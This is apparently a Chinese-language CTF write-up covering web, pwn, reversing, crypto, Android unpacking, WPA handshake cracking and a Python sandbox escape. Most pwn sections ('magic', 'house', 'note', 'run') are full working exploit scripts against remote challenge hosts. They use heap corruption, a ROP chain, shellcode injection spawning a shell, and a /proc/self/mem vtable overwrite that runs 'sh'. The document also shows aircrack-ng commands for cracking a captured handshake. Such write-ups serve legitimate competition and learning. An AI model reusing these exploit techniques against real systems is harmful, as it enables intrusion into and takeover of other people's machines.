

## easyweb

username=admin&password=

空密码

## Mrp.q

```python
from pwn import *
import hashlib
from decimal import *
from Crypto.Util.number import bytes_to_long, long_to_bytes, inverse
#p = process('./MrP_Hnhwkzw')
p = remote('43.254.1.117', 30472)
#context.log_level='debug'

p.recvuntil('heart: ')
d1 = p.recv(32)
p.recv(1)
d2 = p.recv(13)
print d1
print d2
l = [0,0,0]
maps = [chr(i) for i in range(0x30,0x3a)]
maps += [chr(i) for i in range(0x60,0x61+26)]
maps += [chr(i) for i in range(0x40,0x41+26)]
maps.append('_')
maps.append('+')
result = ''

def xor(s, ch):
    result = ''
    for x in s:
        result += chr(ord(x)^ord(ch))
    return result.encode('hex')

for l[0] in maps:
    for l[1] in maps:
        for l[2] in maps:
            padding = ''.join(l)
            #padding = chr(l[0])+chr(l[1])+chr(l[2])
            #print hashlib.md5(d2+padding).hexdigest()
            #print d1
            if xor(hashlib.md5(d2+padding).digest(),'w') == d1:
                result = padding
                break
def pr():
    p.recvuntil('4.')

def divm(m, r, N):
    return inverse(r, N) * m % N
context.log_level='debug'
p.sendline(result)
pr()
N1 = 0x60339c688f579dd4f661bb3430e18672349f1e8843b062e11abb15d34bdaca8c2c01c18983216af16cb323c17058ed36f233375fe89291585b82e32034ab625896f250e35e9dda1a78d6f3014b4403f4690c1bfae9d984c1a91d9ec2a499ff36e62d2872b677582e1de8ff3f31cdbba408bcddc4f024ad327a5f590f12848d955bb3fef29dbcd49b6918d6880243602cbf9a906df384716a66c9ea144db2d4a5733c7de44db7b2b6a77fd17f34e7e837793114b6f7e7d7b4529523d0eb04300f42f84720dd651e9a653d642dedef29dd388efa64f42a2ae50d7985497f4774c56cdbc2f5a3ea4734e683279328486fe4427d72f2f68465fb5a8a4ac0478b49fb

N2 = 0x6b630677d9178549d6de070923e9d66869a8007b08071fdc4ea3755a97f9f5b03806bb743d570a0e573861cf3636a8c1d76e171bf742a28800b57061047be6a672654df76bd92f488123a7f8e0922ac1d4c62465db3311e4bec159b8827fffe3fb59486a194001fbd68824767cadc26189d2e29b61c8125f5c52dc153f20a86bd086fe13da4853bca02ab60893c2d0a960abce24b96d79afa1289d0cbdc4846dcfc9ea213be13c9e76357cc86714e0220ddaa8462e91dcdac14642cd3648c42b53c7ec0ad396494ed5bd461b2efdb2027a80e582d0c70a5eac18ac4b61a6844c26bb7ba606a9b8991902a002a964fd8b3a9c5ff29a3ab387ab27d8b4acd0fd63
import time

def isqrt(n):
    x = n
    y = (x + 1) // 2
    while y < x:
        x = y
        y = (x + n // x) // 2
    return x

def cal(o):
    p.sendline(str(o))
    p.sendline('3')
    p.recvuntil('c:')
    data1 = p.recvuntil('\n')[:-1]
    data1 = int(data1,16)
    time.sleep(1)
    p.sendline(str(o))
    p.recvuntil('c:')
    data2 = p.recvuntil('\n')[:-1]
    data2 = int(data2,16)
    if o == 1:
        N = N1
    else:
        N = N2
    v = divm(data1,data2,N)
    assert v == isqrt(v)**2
    return isqrt(v)

rand1 = cal(1)
rand2 = cal(2)
s1 = long_to_bytes(rand1)
s2 = long_to_bytes(rand2)
assert len(s1) == 16
assert len(s2) == 16
p.sendline('4')
p.sendline(s1.encode('hex'))
p.sendline(s2.encode('hex'))
p.interactive()
```

## task_reverse

```python
strA = "1B2GH0J65NEG37F69158D9H193871222"
strB = ''
listA = []
listB = [0xd7,0xdb,0xb4,0x0e,0x1e,0x17,0x2b,0x76,0x34,0xcc,0x0,0x81,0xef,0x67,0x29,0xb3]
listC = []
md5 = ''
for i in range(len(strA)):
	if(ord(strA[i]) >= ord('A') and ord(strA[i]) <= ord('Z')):
    	strB += chr(ord(strA[i]) - (i % 10))
	else:
    	strB += strA[i]
print(strB)
#第一段更改md5中字母的ascii
for i in range(0,len(strB),2):
	subFlag = (strB[i] + strB[i + 1])
	listA.append(int(subFlag,16))
for i in range(16):
	listC.append(listA[i] ^ listB[i])
for i in range(16):
	md5 += str(hex(listA[i] ^ listB[i]))
md5 = md5.replace('0x','')
print(md5)
#第二段在更改的基础上将其异或
fp = open(r'C:\Users\Ch1p\Desktop\1.txt','rb')
a = fp.read()
b = []
num = 0
for i in a:
	if(num % 2 == 0):
    	b.append(i ^ 67)
	else:
    	b.append(i ^ 76)
	num += 1
fp.close()
fp2 = open(r'C:\Users\Ch1p\Desktop\2.txt','wb')
for i in b:
	fp2.write(bytes((i,)))
fp2.close()
```

## magic

```python
from pwn import *

#p = process('./magic')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
#libc = ELF('./libc')
p = remote('117.78.43.163',31026)
def pr():
    return p.recvuntil('>> ')

def create(name):
    p.sendline('1')
    p.recvuntil('name:')
    p.send(name)
    pr()

def spell(idx, name, shell=0):
    p.sendline('2')
    p.recvuntil('Who')
    p.sendline(str(idx))
    p.recvuntil('name:')
    p.send(name)
    if shell == 1:
        p.interactive()
    return pr()

#context.log_level='debug'
pr()
create('a'*0x18)
spell(0, 'q'*0x20)
for i in range(12):
    spell(-2,'\x00')
spell(-2,'\x00'*7)
spell(-2,p64(0x602050)*2)
data = spell(-2,'\x00'*2+p64(0x231)+p32(0xfbad24a8)+';$0\x00'+p64(0x602050))
memset_addr = u64(data[:8])
print 'memset: %lx'%memset_addr
p.sendline('3')
p.recv()
p.sendline('-2')
pr()
for i in range(4):
    spell(-2,'\x00')
data = spell(-2,'\x00')
heap_addr = u64(data[:8])
print 'heap: %lx'%heap_addr
symbol_memset = 0x7f4803bdf970-0x00007f4803a6d000
system_addr = memset_addr-symbol_memset+libc.symbols['system']
for i in range(5):
    spell(-2,'\x00')
spell(-2,'\x00'*0x20)
#spell(-2,p64(0)+'\x00'*2+p64(heap_addr-0x490))
create(p64(system_addr)*3)
raw_input()
spell(-2,p64(0)+'\x00'*2+p64(heap_addr-0x22df240+0x22e02f0-0x30),1)
```

## house

```python
from pwn import *
context.log_level='debug'
#p = process('./house')
local = 0
p = remote('117.78.43.163',31531)
def pr():
    return p.recvuntil('Exit\n')

p.recvuntil('?\n')
p.sendline('Y')
pr()

def find(name):
    p.sendline('1')
    p.recvuntil('?')
    p.send(name)
    pr()

def locate(off):
    p.sendline('2')
    p.recvuntil('?')
    p.send(str(off)+'\x00')
    pr()

def gets(size, data='', read=0):
    p.send('3')
    p.recvuntil('?\n')
    p.send(str(size)+'\x00')
    if read:
        p.send(data)
    return pr()

def give(data):
    p.send('4')
    p.recvuntil(':')
    p.send(data)
    pr()

def tohex(s):
    return int(s.split('-')[0],16)

def parse_addr(data):
    l = data.split('\n')
    binary = tohex(l[1])
    heap = tohex(l[4])
    stack = tohex(l[5])
    libc = tohex(l[6])
    if local:
        stack2 = tohex(l[-7])
    else:
        stack2 = tohex(l[-6])
    print 'binary addr:%lx'%binary
    print 'heap addr:%lx'%heap
    print 'stack addr:%lx'%stack
    print 'libc addr:%lx'%libc
    print 'stack2 addr: %lx'%stack2
    return (binary, heap, stack, libc,stack2)

def read_file(filename):
    find(filename+'\x00')
    return gets(0x1000)
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')


data = read_file('/proc/self/maps')
print data
(binary_addr, heap_addr,stack_addr,libc_addr,stack2) = parse_addr(data)
stage = binary_addr + 0x203050
find('/proc/self/maps\x00'.ljust(0x18,'\x00')+p64(stage))
give('/flag\x00')

# here we read /proc/self/mem
find('/proc/self/mem\x00')
def quick_search(addr, size, token):
    for i in range(size/0x1000):
        print i
        locate(addr+0x1000*(i+24))
        ret = gets(0xf00)
        if p64(token) in ret:
            return (addr,ret)
    return 0

(addr, content) = quick_search(stack2, 0x21000, binary_addr + 0xed5)
print '%lx'%addr

child_stack = content[content.index(p64(binary_addr + 0xed5))+48:][:8]
child_stack = u64(child_stack)
print 'random_var:%lx'%child_stack
print 'child_stack: %lx'%(child_stack+stack_addr)

target = child_stack+stack_addr - 0x520+0x468
find('/proc/self/maps\x00'.ljust(0x18,'\x00')+p64(target))
pop_rdi = 0x0000000000001823 + binary_addr
pop_rsi = 0x0000000000001821 + binary_addr # pop rsi, pop r15, ret
pop_rdx = 0x1435FA + libc_addr # pop rdx; pop rbx, ret
open_addr = 0xc00 + binary_addr
write_addr = 0xb20 + binary_addr
read_addr = 0xba0 + binary_addr

ropchain = p64(pop_rdi)
ropchain += p64(target)
ropchain += p64(pop_rsi)
ropchain += p64(0)*2
ropchain += p64(pop_rdx)
ropchain += p64(0)+p64(0)
ropchain += p64(open_addr)

ropchain += p64(pop_rdi)
ropchain += p64(7)
ropchain += p64(pop_rsi)
ropchain += p64(stage)+p64(0)
ropchain += p64(pop_rdx)
ropchain += p64(0x1000)+p64(0)
ropchain += p64(read_addr)

ropchain += p64(pop_rdi)
ropchain += p64(1)
ropchain += p64(pop_rsi)
ropchain += p64(stage)+p64(0)
ropchain += p64(pop_rdx)
ropchain += p64(0x30)+p64(0)
ropchain += p64(write_addr)
d = '/home/ctf/flag'.ljust(16,'\x00')+p64(0xdeadbeef)*2+ropchain
p.sendline('4')
p.recv()
p.send(d)
p.interactive()
```



## note

```python
from pwn import *
context.log_level='debug'
local = 0
if local:
    p = process('./note')
else:
    p = remote('49.4.23.11',32730)

def pr():
    p.recvuntil('>> ')

def add(idx,size,name):
    p.send('1\n')
    p.recvuntil('index:')
    p.send(str(idx)+'\n')
    p.recvuntil('size:')
    p.sendline(str(size))
    p.sendline(name)
    pr()
    pr()
pr()
padding = '\xeb\x19'

add(-7,8, asm('xor rax,rax',arch='amd64').ljust(5,'\x90')+padding)
add(0, 8, '\x90\x90'+'\xe8\x19'+p64(0))
add(1, 8, asm('pop rsi;xchg r11,rdx;',arch='amd64').ljust(5,'\x90')+padding)
add(2, 8, asm('shl edx,8;syscall',arch='amd64').ljust(7,'\xcc'))
p.send('5')
raw_input()
shellcode = asm(pwnlib.shellcraft.amd64.sh(),arch='amd64')
p.send('\x90'*0x100+shellcode)
p.interactive()
```

## trygetflag

用爱加密加了壳

ida动态调

发现爱加密有反调试,找到调用exit调用处,强行patch到正常逻辑

dump出odex

还原出dex,发现函数已经出来了

![img](https://lh3.googleusercontent.com/xRwcWzbR4OCPj1SMpaDpa9i2a8FHKlw7qsCxKrledFO6cB8Sp6ERkl8Mt-vNyc7Q4oXflm9DNJ0MWeUZZ8gmbB4JrteHLM6u6eBRiEmGF5x3t08LyVAq-d2e4jJ1d0PAghNUCbB0)

```python
key=[119, 111, 119, 44, 105, 116, 39, 115, 115, 111, 98, 114, 117, 116, 97, 108]
key = ''.join(map(chr,key))

from Crypto.Cipher import AES
enc='pLFw0Gh8EQFJJU9fxmoK1pCZa2sEoaInLimgt+fZcow='.decode('base64')
obj = AES.new(key,  AES.MODE_ECB, key)
dec = obj.decrypt(enc)
print dec
```

## flag_in_your_hand

关键函数是ck
一步步逆回去就好了

```js
var a = [100, 116, 101, 48, 118, 104, 102, 120, 117, 108, 119, 124];
for (i = 0; i < a.length; i++) {
  a[i] = a[i] -3;
}
binl2rstr(a)
```

## sm

问题出在这里

```python
for i in range(512):

        p=getPrime(512-order[i]+10)

        pre=bin(p)2:)]+"1"

        ps.append(int(pre+"0"*(512-len(pre)),2))

```

通过这个循环生成的数有一个特点 

![img](https://lh3.googleusercontent.com/LIFvMc6faxtW8lf0uTQSMf3i6OTqlnSz0fj2IQVV0mHqplAGBjFBMVeu2wEXXoa2TXItw78CXRPi14HRMeMg771BJH5iJKM-7D7BvuthyyXqbneO3LHI0MpsJF2cRX8YFfjf-OoT)

末尾的0的个数就是传入的order[i]-1 order[i]的范围是1-512 并且没有重复
如果按1-512这个顺序生成 就会发现末尾的0的数量越来越多 而且非常规律
之后进行了 r=r^ps[i] 异或运算前一位不会影响后一位
这样就可以从后往前逐位计算

```python
# -- coding:utf-8 -*-
from Crypto.Util.number import getPrime, isPrime, long_to_bytes, bytes_to_long
from Crypto.Cipher import AES
import hashlib
import base64

r = 6753785483255906709117615805253027649453460653974415214642466102672301763943358839905575042938258141827000621474498066533397472809407687579125519939754658
r = bin(r)[2:]
print r

pin = []

# 通过ps推算order的顺序
ps = []
with open('ps', 'r') as f:
    all_data = f.readlines()
    for line in all_data:
        # print bin(int(j.strip()))[2:]
        k = 1
        line = bin(int(line.strip()))[2:]
        while 1: 
            if line[-k] == '1':
                # print k
                ps.append(k)
                break
            k += 1

print ps

# 逐位计算 获取参与异或的数
with open('ps', 'r') as f:
    all_data = f.readlines()
    for k in range(1, 512):
        tmp = 0
        if pin:
            for l in pin:
                tmp ^= int(bin(int(all_data[ps.index(l)].strip()))[2:][-k])
        tmp ^= int(bin(int(all_data[ps.index(k)].strip()))[2:][-k])
        # print k, int(bin(int(all_data[ps.index(k)].strip()))[2:][-k]), tmp, r[-k]
        if int(tmp) == int(r[-k]):
            pin.append(k)
    print "pin:{}".format(pin)
    
# 找到参与异或的数在ps中的位置 还原key
num = ['0'] * 512
for l in pin:
    i = ps.index(l)
    num[i] = '1'
num = ''.join(num)
num = int(num, 2)
print isPrime(num)
# num = 11400599473028310480620591074112690318799501642425666449519888152497765475409346201248744734864375690112798434541063767944755958258558428437088372812844657

key=long_to_bytes(int(hashlib.md5(long_to_bytes(num)).hexdigest(),16))
aes_obj = AES.new(key, AES.MODE_ECB)
ef = "5eFo3ANg2fu9LRrFktWCJmVvx6RgBFzd0R8GXQ8JD78="
flag = aes_obj.decrypt(ef.decode('base64'))
print flag

```

## 验证码

手打得到flag

## 寻找入侵者

aircrack-ng -w pass.txt /Users/ralph/Desktop/题目5/handshake.cap

跑出密码，然后用

airdecap-ng -e 'Honey' -p '88:25:93:c1:c8:eb' hanshake.cap

解密握手包，跟踪http流发现wiattack.net/yuOHOCPC6I/key.rar

下载过来又是一个握手包

然后过滤器设置wlan.addr == 88:25:93:c1:c8:eb
在最后面发现不一样的包，把里面的数据一交，竟然对了

## picture

png后面有个zlib压缩内容

```python
enc='789CAD50C972A3400CFD200E661B630E7350B3B631C40D36DBCD3471830183431C96AF1FA899A472CB6554AAA727E995A45220808E1001581CF674A8F9F134E15315B12537645871854454AB348DBDFEC99A7BB3B953FADC0C975C79B8C45711A15D43DF26A932AF82322B2C4C3E9877708651CE4BFBBE3BF379280A09D42E8A38EE6A39FDB6ED04A5746DEF2889C88F2762C4BABFE96951725A1A73AA1405D7B67498C253CB680474008237F0D39DDADAFC6BF88BA15B26FAB5C6807D16002DD47B792838BEF083F5E2AA535FA86F2748E45972265B7C77D1D9E84DC4FEE997D1E1CAED61019D82F94E5E63BFCD4499B9A52CC584778E3799C34EA13E6CB1BD2EB94EBA336DCC5B1AED8B44EC9963091F54228C36E152FBC563CB2B326B609965CEB9566D75D2326CA45D669D19BE8DC36BECB56934F678060E97ABAE7EA6018C070D755909BB2C52AB3C1AEB23E31DAC01FBBE3B6AC229E3FD2E6FEAF912A94F3FDE4F9984B75F9ACB7F8A01EC0E011A92D89B73519D520D14E7F31700BFFF000FD1C232'.decode('hex')

import zlib

dec = zlib.decompress(enc)
dec = dec.decode('base64')
open('dec','wb').write(dec)

```

得到一个压缩包

注释为

```bash
[Python 2.7]
>>> ▆▆▆

Traceback (most recent call last):
  File "<pyshell#0>", line 1, in <module>
    ▆▆▆
ZeroDivisionError: ▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆ <- password ;)
>>> 
```

从而得到密码

integer division or modulo by zero

解压得到code文件

最后用uudecode

## run

python沙箱逃逸

```python
print ().__class__.__bases__[0].__subclasses__()[40]("/etc/passwd").read()

from pwn import *
context.log_level='debug'
p = remote('49.4.23.11',32266)
def pr():
    p.recvuntil('>>>')
pr()
p.sendline('file = ().__class__.__bases__[0].__subclasses__()[40]')
pr()
p.sendline("filename = '/proc/self/maps'")
pr()
p.sendline("f = file.__new__(file, filename, 'r')")
pr()
p.sendline("f.__init__(filename,'r')")
pr()
p.sendline("print f.read()")
for i in range(4):
    p.recvuntil('ibdl-2.23.so\n')
libc = int(p.recvline().split('-')[0],16)
print 'libc:%x'%libc
pr()
p.sendline("libc = 0x%lx"%libc)
pr()
p.sendline("stdout = libc+0x3C5620")
pr()
stdout = libc+0x3C5620
p.sendline("sytem = libc+0x45390")
pr()
system = libc+0x45390
p.sendline("vtable = stdout+0xd8")
pr()
p.sendline("filename = '/proc/self/mem'")
pr()
p.sendline("f = file.__new__(file, filename, 'w')")
pr()
p.sendline("f.__init__(filename,'w')")
pr()
p.sendline("print vtable")
pr()
p.sendline("print sytem")
pr()
p.sendline("f.seek(stdout)")
pr()
p.sendline("f.write('\\x86\\x22\\xad\\xfb'+';sh\\x00')")
pr()
p.sendline("f.seek(vtable)")
pr()
vtable_addr = p64(stdout+0xe0)
v_s = ''
for x in vtable_addr:
    v_s += '\\'
    v_s += 'x'
    v_s += x.encode('hex').rjust(2,'0')
system_addr = p64(system)
s_s = ''
for x in system_addr:
    s_s += '\\'
    s_s += 'x'
    s_s += x.encode('hex').rjust(2,'0')
print v_s
print "f.write('%s'+'%s'*10)"%(v_s,s_s)
p.sendline("f.write('%s'+'%s'*20)"%(v_s,s_s))
p.sendline('f.seek(1)')
p.interactive()
```

